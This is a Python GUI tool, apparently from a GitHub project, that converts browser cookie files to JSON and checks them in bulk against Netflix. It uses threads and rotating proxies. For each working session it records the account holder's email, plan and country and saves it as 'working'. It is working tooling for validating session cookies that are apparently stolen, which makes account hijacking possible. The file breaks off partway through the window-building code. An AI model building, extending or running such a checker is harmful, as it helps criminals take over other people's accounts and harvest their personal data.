import json
import hashlib
import os
import re
import sys
import shutil
import time
import threading
import tkinter as tk
from tkinter import ttk, filedialog, font as tkfont
import requests
from requests.exceptions import RequestException, ConnectionError
from http.client import RemoteDisconnected
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import sv_ttk

# ─────────────────────────────────────────────────────────────
# THEME
# ─────────────────────────────────────────────────────────────
BG        = "#0a0a0a"
BG2       = "#111111"
BG3       = "#1a1a1a"
CARD      = "#161616"
BORDER    = "#2a2a2a"
RED       = "#e50914"
RED_DIM   = "#8b0000"
RED_HOVER = "#ff1a24"
GREEN     = "#46d369"
YELLOW    = "#f5c518"
BLUE      = "#4a9eff"
MUTED     = "#555555"
TEXT      = "#e5e5e5"
TEXT_DIM  = "#888888"
WHITE     = "#ffffff"

# ─────────────────────────────────────────────────────────────
# HELPERS (shared with both tabs)
# ─────────────────────────────────────────────────────────────

def decode_hex_escapes(s):
    if not s:
        return s
    s = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9A-Fa-f]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s


def extract_info(text):
    patterns = {
        "localizedPlanName": (
            r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,'
            r'\s*"value"\s*:\s*"([^"]+)"'
        ),
        "emailAddress":    r'"emailAddress"\s*:\s*"([^"]+)"',
        "countryOfSignup": r'"countryOfSignup"\s*:\s*"([^"]+)"',
    }
    result = {}
    for key, pat in patterns.items():
        m = re.search(pat, text)
        result[key] = decode_hex_escapes(m.group(1)) if m else None
    return result


def is_netflix_account_url(url):
    """Netflix redirects valid /YourAccount sessions to /account."""
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path == "/account"


def is_netflix_login_url(url):
    """Expired cookies are redirected to a localized /login URL."""
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path.endswith("/login")


def is_netflix_browse_url(url):
    """Working subscribed cookies should be able to reach /browse."""
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path.startswith("/browse")


def cookie_fingerprint(cookies):
    """
    Build a stable fingerprint from actual cookie entries only.
    Metadata rows appended by this checker do not include name/value, so they
    are ignored and will not change duplicate detection.
    """
    parts = []
    for cookie in cookies:
        if not isinstance(cookie, dict) or "name" not in cookie or "value" not in cookie:
            continue
        domain = str(cookie.get("domain", "")).lower()
        path = str(cookie.get("path", ""))
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        parts.append(f"{domain}\t{path}\t{name}\t{value}")
    if not parts:
        return ""
    payload = "\n".join(sorted(parts))
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()


def load_cookie_fingerprints(folder):
    fingerprints = set()
    if not os.path.isdir(folder):
        return fingerprints

    for filename in os.listdir(folder):
        path = os.path.join(folder, filename)
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "r", encoding="utf-8") as f:
                fingerprint = cookie_fingerprint(json.load(f))
                if fingerprint:
                    fingerprints.add(fingerprint)
        except Exception:
            pass
    return fingerprints


def proxy_label(proxies):
    if not proxies:
        return "n/a"
    return proxies.get("https") or proxies.get("http") or "n/a"


def identify_file(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            json.load(f)
        return "json"
    except json.JSONDecodeError:
        return "netscape"
    except Exception:
        return "error"


def convert_netscape_to_json(content):
    cookies = []
    for line in content.splitlines():
        fields = line.strip().split("\t")
        if len(fields) >= 7:
            cookies.append({
                "domain":     fields[0].replace("www", ""),
                "flag":       fields[1],
                "path":       fields[2],
                "secure":     fields[3] == "TRUE",
                "expiration": fields[4],
                "name":       fields[5],
                "value":      fields[6],
            })
    return cookies


def validate_proxy(proxy_url, timeout=8):
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        with requests.Session() as session:
            session.trust_env = False
            r = session.get("https://www.google.com", proxies=proxies, timeout=timeout)
        return r.status_code < 500
    except Exception:
        return False


def parse_proxy_line(line, proxy_type):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "@" in line:
        return f"{proxy_type}://{line}"
    parts = line.split(":")
    if len(parts) == 2:
        return f"{proxy_type}://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        h, p, u, pw = parts
        return f"{proxy_type}://{u}:{pw}@{h}:{p}"
    return None


# ─────────────────────────────────────────────────────────────
# WIDGET HELPERS
# ─────────────────────────────────────────────────────────────

def make_button(parent, text, cmd, color=RED, width=None, small=False):
    size = 9 if small else 10
    btn = tk.Button(
        parent, text=text, command=cmd,
        bg=color, fg=WHITE, activebackground=RED_HOVER,
        activeforeground=WHITE, relief="flat", cursor="hand2",
        font=("segoe ui", size, "bold"),
        padx=16 if not small else 10,
        pady=7  if not small else 4,
        bd=0
    )
    if width:
        btn.config(width=width)

    def on_enter(e):
        btn.config(bg=RED_HOVER if color == RED else "#333")
    def on_leave(e):
        btn.config(bg=color)

    btn.bind("<Enter>", on_enter)
    btn.bind("<Leave>", on_leave)
    return btn


def make_label(parent, text, size=10, color=TEXT, bold=False):
    weight = "bold" if bold else "normal"
    return tk.Label(parent, text=text, bg=CARD,
                    fg=color, font=("segoe ui", size, weight))


def separator(parent, color=BORDER):
    f = tk.Frame(parent, bg=color, height=1)
    f.pack(fill="x", pady=8)
    return f


# ─────────────────────────────────────────────────────────────
# LOG PANEL
# ─────────────────────────────────────────────────────────────

class LogPanel(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2, bd=0)

        hdr = tk.Frame(self, bg=BG3)
        hdr.pack(fill="x")
        tk.Label(hdr, text="▶  LIVE LOG", bg=BG3, fg=RED,
                 font=("segoe ui", 9, "bold"), pady=6, padx=10).pack(side="left")
        make_button(hdr, "CLEAR", self.clear, color="#222", small=True).pack(side="right", padx=8, pady=4)

        self.text = tk.Text(
            self, bg=BG2, fg=TEXT, font=("segoe ui", 9),
            relief="flat", bd=0, wrap="word",
            state="disabled", insertbackground=RED
        )
        self.text.pack(fill="both", expand=True, padx=2)

        sb = ttk.Scrollbar(self, command=self.text.yview)
        sb.pack(side="right", fill="y")
        self.text.config(yscrollcommand=sb.set)

        # Tag colours
        self.text.tag_config("ok",      foreground=GREEN)
        self.text.tag_config("err",     foreground="#ff4444")
        self.text.tag_config("warn",    foreground=YELLOW)
        self.text.tag_config("info",    foreground=BLUE)
        self.text.tag_config("muted",   foreground=MUTED)
        self.text.tag_config("time",    foreground="#444")

    def log(self, msg, tag="muted"):
        ts = time.strftime("%H:%M:%S")
        self.text.config(state="normal")
        self.text.insert("end", f"{ts}  ", "time")
        self.text.insert("end", msg + "\n", tag)
        self.text.see("end")
        self.text.config(state="disabled")

    def clear(self):
        self.text.config(state="normal")
        self.text.delete("1.0", "end")
        self.text.config(state="disabled")


# ─────────────────────────────────────────────────────────────
# STAT CARD
# ─────────────────────────────────────────────────────────────

class StatCard(tk.Frame):
    def __init__(self, parent, label, color=TEXT):
        super().__init__(parent, bg=BG3, bd=0, highlightthickness=1,
                         highlightbackground=BORDER)
        self.color = color
        tk.Label(self, text=label, bg=BG3, fg=TEXT_DIM,
                 font=("segoe ui", 8)).pack(pady=(10, 2))
        self._var = tk.StringVar(value="0")
        tk.Label(self, textvariable=self._var, bg=BG3, fg=color,
                 font=("segoe ui", 22, "bold")).pack(pady=(0, 10))

    def set(self, val):
        self._var.set(str(val))


# ─────────────────────────────────────────────────────────────
# CONVERTER TAB
# ─────────────────────────────────────────────────────────────

class ConverterTab(tk.Frame):
    def __init__(self, parent, log: LogPanel):
        super().__init__(parent, bg=CARD)
        self.log = log
        self._build()

    def _build(self):
        # Header
        hdr = tk.Frame(self, bg=CARD)
        hdr.pack(fill="x", padx=24, pady=(20, 8))
        tk.Label(hdr, text="Cookie Converter", bg=CARD, fg=WHITE,
                 font=("segoe ui", 13, "bold")).pack(side="left")
        tk.Label(hdr, text="  Netscape / JSON → json_cookies/", bg=CARD,
                 fg=TEXT_DIM, font=("segoe ui", 9)).pack(side="left", pady=2)

        separator(self)

        body = tk.Frame(self, bg=CARD)
        body.pack(fill="x", padx=24)

        # Source folder row
        row1 = tk.Frame(body, bg=CARD)
        row1.pack(fill="x", pady=6)
        tk.Label(row1, text="SOURCE FOLDER", bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8, "bold"), width=16, anchor="w").pack(side="left")
        self.src_var = tk.StringVar(value="No folder selected")
        tk.Label(row1, textvariable=self.src_var, bg=BG3, fg=BLUE,
                 font=("segoe ui", 9), anchor="w", padx=8,
                 relief="flat").pack(side="left", fill="x", expand=True, ipady=5)
        make_button(row1, "BROWSE", self._pick_src, small=True).pack(side="left", padx=(6, 0))

        # Output folder row
        row2 = tk.Frame(body, bg=CARD)
        row2.pack(fill="x", pady=6)
        tk.Label(row2, text="OUTPUT FOLDER", bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8, "bold"), width=16, anchor="w").pack(side="left")
        self.out_var = tk.StringVar(value="json_cookies")
        tk.Entry(row2, textvariable=self.out_var, bg=BG3, fg=TEXT,
                 font=("segoe ui", 9), relief="flat",
                 insertbackground=RED).pack(side="left", fill="x", expand=True, ipady=5, padx=(0, 6))

        # Clear old option
        self.clear_var = tk.BooleanVar(value=False)
        ck = tk.Checkbutton(body, text="Clear existing output folder before converting",
                            variable=self.clear_var, bg=CARD, fg=TEXT_DIM,
                            activebackground=CARD, activeforeground=TEXT,
                            selectcolor=BG3, font=("segoe ui", 9),
                            cursor="hand2")
        ck.pack(anchor="w", pady=6)

        separator(self)

        # Progress
        self.prog_var = tk.DoubleVar(value=0)
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Red.Horizontal.TProgressbar",
                        troughcolor=BG3, background=RED,
                        bordercolor=BG3, lightcolor=RED, darkcolor=RED)
        pb = ttk.Progressbar(self, variable=self.prog_var, maximum=100,
                             style="Red.Horizontal.TProgressbar", length=400)
        pb.pack(fill="x", padx=24, pady=(0, 8))

        self.status_var = tk.StringVar(value="Ready")
        tk.Label(self, textvariable=self.status_var, bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8)).pack(anchor="w", padx=24)

        separator(self)

        btn_row = tk.Frame(self, bg=CARD)
        btn_row.pack(padx=24, pady=8, anchor="w")
        make_button(btn_row, "▶  START CONVERTING", self._start).pack(side="left")

        # Mini stats
        stats = tk.Frame(self, bg=CARD)
        stats.pack(fill="x", padx=24, pady=12)
        self._s_total   = self._mini_stat(stats, "TOTAL",     TEXT)
        self._s_ok      = self._mini_stat(stats, "CONVERTED", GREEN)
        self._s_appended= self._mini_stat(stats, "APPENDED",  BLUE)
        self._s_err     = self._mini_stat(stats, "ERRORS",    "#ff4444")

    def _mini_stat(self, parent, label, color):
        f = tk.Frame(parent, bg=BG3, bd=0, highlightthickness=1,
                     highlightbackground=BORDER, width=90)
        f.pack(side="left", padx=4, ipadx=12, ipady=8)
        tk.Label(f, text=label, bg=BG3, fg=TEXT_DIM,
                 font=("segoe ui", 7)).pack()
        var = tk.StringVar(value="0")
        tk.Label(f, textvariable=var, bg=BG3, fg=color,
                 font=("segoe ui", 16, "bold")).pack()
        return var

    def _pick_src(self):
        path = filedialog.askdirectory(title="Select cookies folder")
        if path:
            self.src_var.set(path)

    def _start(self):
        src = self.src_var.get()
        if src == "No folder selected" or not os.path.isdir(src):
            self.log.log("No valid source folder selected.", "err")
            return
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        src     = self.src_var.get()
        out_dir = self.out_var.get().strip() or "json_cookies"

        files = [f for f in os.listdir(src) if os.path.isfile(os.path.join(src, f))]
        total = len(files)
        if total == 0:
            self.log.log("Source folder is empty.", "warn")
            return

        self._s_total.set(total)
        self._s_ok.set(0); self._s_appended.set(0); self._s_err.set(0)
        self.status_var.set("Converting…")

        # Handle output dir
        if self.clear_var.get() and os.path.isdir(out_dir):
            shutil.rmtree(out_dir)
            self.log.log(f"Cleared old output folder: {out_dir}", "warn")
        os.makedirs(out_dir, exist_ok=True)

        converted = appended = errors = 0

        for i, filename in enumerate(files, 1):
            self.prog_var.set((i / total) * 100)
            self.status_var.set(f"Processing {i}/{total}: {filename}")
            filepath = os.path.join(src, filename)
            ftype    = identify_file(filepath)
            dst      = os.path.join(out_dir, filename)

            try:
                if ftype == "json":
                    with open(filepath, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    if os.path.exists(dst):
                        with open(dst, "r", encoding="utf-8") as f:
                            existing = json.load(f)
                        existing.extend(data)
                        with open(dst, "w", encoding="utf-8") as f:
                            json.dump(existing, f, indent=4)
                        appended += 1
                        self.log.log(f"[APPENDED]  {filename}", "info")
                    else:
                        shutil.copy(filepath, dst)
                        converted += 1
                        self.log.log(f"[COPIED]    {filename}", "ok")

                elif ftype == "netscape":
                    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    data = convert_netscape_to_json(content)
                    if os.path.exists(dst):
                        with open(dst, "r", encoding="utf-8") as f:
                            existing = json.load(f)
                        existing.extend(data)
                        with open(dst, "w", encoding="utf-8") as f:
                            json.dump(existing, f, indent=4)
                        appended += 1
                        self.log.log(f"[APPENDED]  {filename}", "info")
                    else:
                        with open(dst, "w", encoding="utf-8") as f:
                            json.dump(data, f, indent=4)
                        converted += 1
                        self.log.log(f"[CONVERTED] {filename}", "ok")
                else:
                    errors += 1
                    self.log.log(f"[ERROR]     {filename} — unrecognised format", "err")

            except Exception as e:
                errors += 1
                self.log.log(f"[ERROR]     {filename} — {e}", "err")

            self._s_ok.set(converted)
            self._s_appended.set(appended)
            self._s_err.set(errors)

        self.prog_var.set(100)
        self.status_var.set(f"Done — {converted} converted, {appended} appended, {errors} errors")
        self.log.log(f"Conversion complete. {converted} new, {appended} appended, {errors} failed.", "ok")


# ─────────────────────────────────────────────────────────────
# CHECKER TAB
# ─────────────────────────────────────────────────────────────

class CheckerTab(tk.Frame):
    def __init__(self, parent, log: LogPanel):
        super().__init__(parent, bg=CARD)
        self.log = log
        self._running   = False
        self._lock      = threading.Lock()
        self._stats     = dict(total=0, working=0, expired=0,
                               duplicate=0, extra=0, errors=0)
        self._proxies   = []
        self._proxy_idx = 0
        self._build()

    # ── UI ────────────────────────────────────────────────────

    def _build(self):
        # ── Header
        hdr = tk.Frame(self, bg=CARD)
        hdr.pack(fill="x", padx=24, pady=(20, 8))
        tk.Label(hdr, text="Cookie Checker", bg=CARD, fg=WHITE,
                 font=("segoe ui", 13, "bold")).pack(side="left")

        separator(self)

        cols = tk.Frame(self, bg=CARD)
        cols.pack(fill="both", expand=True, padx=24, pady=4)

        left  = tk.Frame(cols, bg=CARD)
        right = tk.Frame(cols, bg=CARD)
        left.pack(side="left", fill="both", expand=True, padx=(0, 12))
        right.pack(side="left", fill="both", expand=True)

        # ── Left: Paths
        self._field(left, "COOKIES FOLDER", "json_cookies", "_ck_dir")
        self._field(left, "OUTPUT FOLDER",  "working_cookies", "_out_dir")

        # ── Threads
        tr = tk.Frame(left, bg=CARD)
        tr.pack(fill="x", pady=4)
        tk.Label(tr, text="THREADS", bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8, "bold"), width=16, anchor="w").pack(side="left")
        self._threads_var = tk.IntVar(value=10)
        tk.Spinbox(tr, from_=1, to=50, textvariable=self._threads_var,
                   bg=BG3, fg=TEXT, font=("segoe ui", 9),
                   relief="flat", width=6,
                   buttonbackground=BG3).pack(side="left")

        separator(left)

        # ── Right: Proxy settings
        tk.Label(right, text="PROXY SETTINGS", bg=CARD, fg=RED,
                 font=("segoe ui", 9, "bold")).pack(anchor="w", pady=(0, 6))

        self._use_proxy = tk.BooleanVar(value=False)
        ck = tk.Checkbutton(right, text="Enable proxy", variable=self._use_proxy,
                            bg=CARD, fg=TEXT, activebackground=CARD,
                            activeforeground=WHITE, selectcolor=BG3,
                            font=("segoe ui", 9), cursor="hand2",
                            command=self._toggle_proxy)
        ck.pack(anchor="w")

        self._proxy_frame = tk.Frame(right, bg=CARD)
        self._proxy_frame.pack(fill="x", pady=4)

        pf_row = tk.Frame(self._proxy_frame, bg=CARD)
        pf_row.pack(fill="x", pady=3)
        tk.Label(pf_row, text="PROXY FILE", bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8, "bold"), width=12, anchor="w").pack(side="left")
        self._pf_var = tk.StringVar(value="No file selected")
        tk.Label(pf_row, textvariable=self._pf_var, bg=BG3, fg=BLUE,
                 font=("segoe ui", 8), anchor="w", padx=6,
                 relief="flat").pack(side="left", fill="x", expand=True, ipady=4)
        make_button(pf_row, "BROWSE", self._pick_proxy, small=True).pack(side="left", padx=(4,0))

        pt_row = tk.Frame(self._proxy_frame, bg=CARD)
        pt_row.pack(fill="x", pady=3)
        tk.Label(pt_row, text="PROXY TYPE", bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8, "bold"), width=12, anchor="w").pack(side="left")
        self._ptype_var = tk.StringVar(value="http")
        for t in ("http", "https", "socks4", "socks5"):
            rb = tk.Radiobutton(pt_row, text=t.upper(), variable=self._ptype_var, value=t,
                                bg=CARD, fg=TEXT_DIM, activebackground=CARD,
                                activeforeground=WHITE, selectcolor=BG3,
                                font=("segoe ui", 8), cursor="hand2")
            rb.pack(side="left", padx=4)

        self._validate_btn = make_button(self._proxy_frame, "▶  VALIDATE PROXIES",
                                         self._validate_proxies, small=True)
        self._validate_btn.pack(anchor="w", pady=4)
        self._proxy_status = tk.StringVar(value="")
        tk.Label(self._proxy_frame, textvariable=self._proxy_status,
                 bg=CARD, fg=GREEN, font=("segoe ui", 8)).pack(anchor="w")

        self._toggle_proxy()

        # ── Stats row
        separator(self)

        stats_row = tk.Frame(self, bg=CARD)
        stats_row.pack(fill="x", padx=24, pady=8)

        self._sc_total = StatCard(stats_row, "TOTAL",     TEXT);     self._sc_total.pack(side="left", fill="x", expand=True, padx=3)
        self._sc_work  = StatCard(stats_row, "WORKING",   GREEN);    self._sc_work.pack(side="left",  fill="x", expand=True, padx=3)
        self._sc_exp   = StatCard(stats_row, "EXPIRED",   "#ff4444");self._sc_exp.pack(side="left",   fill="x", expand=True, padx=3)
        self._sc_dup   = StatCard(stats_row, "DUPLICATE", YELLOW);   self._sc_dup.pack(side="left",   fill="x", expand=True, padx=3)
        self._sc_extra = StatCard(stats_row, "EXTRA MEM", BLUE);     self._sc_extra.pack(side="left", fill="x", expand=True, padx=3)
        self._sc_err   = StatCard(stats_row, "ERRORS",    MUTED);    self._sc_err.pack(side="left",   fill="x", expand=True, padx=3)

        # ── Progress
        self.prog_var = tk.DoubleVar(value=0)
        style = ttk.Style()
        style.configure("Red.Horizontal.TProgressbar",
                        troughcolor=BG3, background=RED,
                        bordercolor=BG3, lightcolor=RED, darkcolor=RED)
        pb = ttk.Progressbar(self, variable=self.prog_var, maximum=100,
                             style="Red.Horizontal.TProgressbar")
        pb.pack(fill="x", padx=24, pady=(4, 2))

        self._status_var = tk.StringVar(value="Ready")
        tk.Label(self, textvariable=self._status_var, bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8)).pack(anchor="w", padx=24)

        separator(self)

        # ── Control buttons
        btn_row = tk.Frame(self, bg=CARD)
        btn_row.pack(padx=24, pady=8, anchor="w")
        self._start_btn = make_button(btn_row, "▶  START CHECKING", self._start)
        self._start_btn.pack(side="left")
        self._stop_btn  = make_button(btn_row, "■  STOP", self._stop, color="#333")
        self._stop_btn.pack(side="left", padx=8)
        self._stop_btn.config(state="disabled")

    def _field(self, parent, label, default, attr):
        row = tk.Frame(parent, bg=CARD)
        row.pack(fill="x", pady=4)
        tk.Label(row, text=label, bg=CARD, fg=TEXT_DIM,
                 font=("segoe ui", 8, "bold"), width=16, anchor="w").pack(side="left")
        var = tk.StringVar(value=default)
        setattr(self, attr, var)
        ent = tk.Entry(row, textvariable=var, bg=BG3, fg=TEXT,
                       font=("segoe ui", 9), relief="flat",
                       insertbackground=RED)
        ent.pack(side="left", fill="x", expand=True, ipady=5)
        make_button(row, "BROWSE",
                    lambda v=var: v.set(filedialog.askdirectory() or v.get()),
                    small=True).pack(side="left", padx=(4, 0))

    def _toggle_proxy(self):
        state = "normal" if self._use_proxy.get() else "disabled"
        for child in self._proxy_frame.winfo_children():
            try:
                child.config(state=state)
            except Exception:
                pass
            for sub in child.winfo_children():
                try:
                    sub.config(state=state)
                except Exception:
                    pass

    def _pick_proxy(self):
        path = filedialog.askopenfilename(
            title="Select proxy file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if path:
            self._pf_var.set(path)

    def _validate_proxies(self):
        path  = self._pf_var.get()
        ptype = self._ptype_var.get()
        if not os.path.isfile(path):
            self.log.log("Proxy file not found.", "err")
            return
        threading.Thread(target=self._run_validate, args=(path, ptype), daemon=True).start()

    def _run_validate(self, path, ptype):
        self.log.log(f"Reading proxy file: {path}", "info")
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()

        urls = [u for u in (parse_proxy_line(l, ptype) for l in lines) if u]
        if not urls:
            self.log.log("No parseable proxies found.", "err")
            return

        self.log.log(f"Validating {len(urls)} proxies…", "info")
        good = []; bad = 0
        c_lock = threading.Lock()

        def _check(url):
            nonlocal bad
            ok = validate_proxy(url)
            with c_lock:
                if ok:
                    good.append({"http": url, "https": url})
                    self.log.log(f"[LIVE]  {url}", "ok")
                else:
                    bad += 1
                    self.log.log(f"[DEAD]  {url}", "err")

        with ThreadPoolExecutor(max_workers=min(20, len(urls))) as ex:
            for _ in as_completed([ex.submit(_check, u) for u in urls]):
                pass

        self._proxies = good
        msg = f"{len(good)} live / {bad} dead"
        self._proxy_status.set(f"✔  {msg}")
        self.log.log(f"Proxy validation done — {msg}", "ok" if good else "warn")

    # ── Checker logic ─────────────────────────────────────────

    def _start(self):
        if self._running:
            return
        ck_dir = self._ck_dir.get().strip()
        if not os.path.isdir(ck_dir):
            self.log.log(f"Cookies folder not found: {ck_dir}", "err")
            return

        files = [f for f in os.listdir(ck_dir) if os.path.isfile(os.path.join(ck_dir, f))]
        if not files:
            self.log.log("Cookies folder is empty.", "warn")
            return

        if self._use_proxy.get() and not self._proxies:
            self.log.log("Proxy enabled but no live proxies loaded. Validate first.", "warn")
            return

        self._running = True
        self._stats   = dict(total=len(files), working=0, expired=0,
                             duplicate=0, extra=0, errors=0)
        self._proxy_idx = 0
        self._update_stats()
        self.prog_var.set(0)
        self._start_btn.config(state="disabled")
        self._stop_btn.config(state="normal")
        self.log.log(f"Starting checker — {len(files)} cookie(s) | threads: {self._threads_var.get()}", "info")

        threading.Thread(target=self._run_checker,
                         args=(files, ck_dir), daemon=True).start()

    def _stop(self):
        self._running = False
        self._status_var.set("Stopping…")
        self.log.log("Stop requested by user.", "warn")

    def _run_checker(self, files, ck_dir):
        out_dir = self._out_dir.get().strip() or "working_cookies"
        os.makedirs(out_dir, exist_ok=True)
        seen_cookie_fingerprints = load_cookie_fingerprints(out_dir)
        threads = self._threads_var.get()
        done = [0]

        def process(filename):
            if not self._running:
                return
            filepath = os.path.join(ck_dir, filename)
            try:
                with open(filepath, "r", encoding="utf-8") as f:
                    cookies = json.load(f)
                fingerprint = cookie_fingerprint(cookies)
            except json.JSONDecodeError:
                with self._lock:
                    self._stats["errors"] += 1
                self.log.log(f"[INVALID JSON]  {filename}", "err")
                self._tick(done, len(files))
                return
            except Exception as e:
                with self._lock:
                    self._stats["errors"] += 1
                self.log.log(f"[ERROR]  {filename} — {e}", "err")
                self._tick(done, len(files))
                return

            result = self._check_cookie(cookies, filename)
            if result is None:
                self._tick(done, len(files))
                return

            plan, email, country, extra_members = result

            safe_email = re.sub(r'[<>:"/\\|?*]', '_', email or "unknown")
            suffix     = " - Extra Membership" if extra_members else ""
            out_name   = f"[{country}] [{safe_email}] - {plan}{suffix}.json"
            out_path   = os.path.join(out_dir, out_name)

            meta = {
                "_comment": "Cookie checked by https://github.com/matheeshapathirana/Netflix-cookie-checker",
                "Credits":  "Matheesha Pathirana",
            }
            cookies.append(meta)

            with self._lock:
                if (fingerprint and fingerprint in seen_cookie_fingerprints) or os.path.isfile(out_path):
                    self._stats["duplicate"] += 1
                    self.log.log(f"[DUPLICATE]  {filename} | {plan} | {email}", "warn")
                else:
                    with open(out_path, "w", encoding="utf-8") as jf:
                        json.dump(cookies, jf, indent=4)
                    if fingerprint:
                        seen_cookie_fingerprints.add(fingerprint)
                    self._stats["working"] += 1
                    if extra_members:
                        self._stats["extra"] += 1
                    self.log.log(
                        f"[WORKING]  [{country}] {filename} | {plan} | {email}"
                        + (" | +EXTRA" if extra_members else ""), "ok"
                    )

            self._update_stats()
            self._tick(done, len(files))

        with ThreadPoolExecutor(max_workers=threads) as ex:
            list(as_completed([ex.submit(process, f) for f in files]))

        self._running = False
        self._start_btn.config(state="normal")
        self._stop_btn.config(state="disabled")
        self._status_var.set("Done")
        self.prog_var.set(100)
        s = self._stats
        self.log.log(
            f"Finished — {s['working']} working, {s['expired']} expired, "
            f"{s['duplicate']} duplicate, {s['errors']} errors", "ok"
        )

    def _check_cookie(self, cookies, filename):
        """Returns (plan, email, country, extra_members) or None if expired/failed."""
        MAX_RETRIES = 3
        USE_PROXY   = self._use_proxy.get()
        url = "https://www.netflix.com/YourAccount"

        with requests.Session() as session:
            session.trust_env = False
            for cookie in cookies:
                try:
                    session.cookies.set(cookie["name"], cookie["value"])
                except Exception:
                    pass
            session.headers.update({"Accept-Encoding": "identity"})

            if USE_PROXY and self._proxies:
                with self._lock:
                    p = self._proxies[self._proxy_idx % len(self._proxies)]
                    self._proxy_idx += 1
                session.proxies.update(p)

            for attempt in range(MAX_RETRIES):
                if not self._running:
                    return None
                try:
                    request_proxies = dict(session.proxies) if USE_PROXY else None
                    resp = session.get(url, timeout=20, allow_redirects=True, proxies=request_proxies)
                    resp.raise_for_status()
                    if not is_netflix_account_url(resp.url):
                        with self._lock:
                            self._stats["expired"] += 1
                        reason = "redirected to login" if is_netflix_login_url(resp.url) else f"ended at {resp.url}"
                        proxy_tag = f" | Proxy: {proxy_label(request_proxies)}" if USE_PROXY else ""
                        self.log.log(f"[EXPIRED]  {filename} — {reason}{proxy_tag}", "err")
                        self._update_stats()
                        return None

                    browse_resp = session.get(
                        "https://www.netflix.com/browse",
                        timeout=20,
                        allow_redirects=True,
                        proxies=request_proxies,
                    )
                    browse_resp.raise_for_status()
                    if not is_netflix_browse_url(browse_resp.url):
                        with self._lock:
                            self._stats["expired"] += 1
                        reason = f"browse redirected to {browse_resp.url}"
                        proxy_tag = f" | Proxy: {proxy_label(request_proxies)}" if USE_PROXY else ""
                        self.log.log(f"[EXPIRED]  {filename} — {reason}{proxy_tag}", "err")
                        self._update_stats()
                        return None

                    content = resp.text
                    info    = extract_info(content)
                    soup    = BeautifulSoup(content, "lxml")

                    # Extra membership
                    em = session.get(
                        "https://www.netflix.com/accountowner/addextramember",
                        allow_redirects=False, timeout=20, proxies=request_proxies
                    )
                    extra_members = em.status_code == 200

                    raw_plan = info.get("localizedPlanName")
                    if raw_plan:
                        plan = raw_plan.replace("miembro\xa0extra", "(Shared Extra Member)")
                    else:
                        page_text = soup.get_text()
                        plan = next(
                            (c for c in ("Premium", "Standard", "Basic") if c in page_text),
                            "Unknown"
                        )

                    raw_email = info.get("emailAddress")
                    email     = raw_email if raw_email else (
                        (soup.select_one(".account-section-email") or type("", (), {"text": "Unknown"})()).text.strip()
                    )
                    country   = info.get("countryOfSignup") or "Unknown"

                    return plan, email, country, extra_members

                except (RequestException, ConnectionError, RemoteDisconnected) as e:
                    proxy_tag = f" | Proxy: {proxy_label(session.proxies)}" if USE_PROXY else ""
                    self.log.log(f"[RETRY]  {filename} — {e}{proxy_tag}", "warn")
                    if USE_PROXY and self._proxies:
                        with self._lock:
                            p = self._proxies[self._proxy_idx % len(self._proxies)]
                            self._proxy_idx += 1
                        session.proxies.update(p)
                    time.sleep(1)

            with self._lock:
                self._stats["errors"] += 1
            self.log.log(f"[FAILED]  {filename} — max retries reached", "err")
            self._update_stats()
            return None

    def _tick(self, done, total):
        done[0] += 1
        pct = (done[0] / total) * 100
        self.prog_var.set(pct)
        self._status_var.set(f"Checking {done[0]}/{total}…")

    def _update_stats(self):
        s = self._stats
        self._sc_total.set(s["total"])
        self._sc_work.set(s["working"])
        self._sc_exp.set(s["expired"])
        self._sc_dup.set(s["duplicate"])
        self._sc_extra.set(s["extra"])
        self._sc_err.set(s["errors"])


# ─────────────────────────────────────────────────────────────
# MAIN WINDOW
# ─────────────────────────────────────────────────────────────

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Netflix Cookie Checker")
        self.configure(bg=BG)
        self.geometry("1050x720")
        self.minsize(900, 640)
        self._build()

    def _build(self):
        # ── Top bar
        topbar = tk.Frame(self, bg=RED, height=3)
        topbar.pack(fill="x")

        navbar = tk.Frame(self, bg=BG2)
        navbar.pack(fill="x")

        tk.Label(navbar, text="NETFLIX", bg=BG2, fg=RED,
                 font=("segoe ui", 14, "bold"), pady=10, padx=20).pack(side="left")
        tk.Label(navbar, text="Cookie Checker", bg=BG2, fg=TEXT_DIM,
                 font=("segoe ui", 9), pady=10).pack(side="left")

        tk.Label(navbar,
                 text="github.com/matheeshapathirana",
                 bg=BG2, fg=MUTED, font=("segoe ui", 8),
                 pady=10, padx=20).pack(side="right")

        # ── Tab bar (custom)
        tabbar = tk.Frame(self, bg=BG)
        tabbar.pack(fill="x", padx=0, pady=0)

        self._tab_btns  = {}
        self._tab_pages = {}

        for name in ("Converter", "Checker"):
            btn = tk.Button(
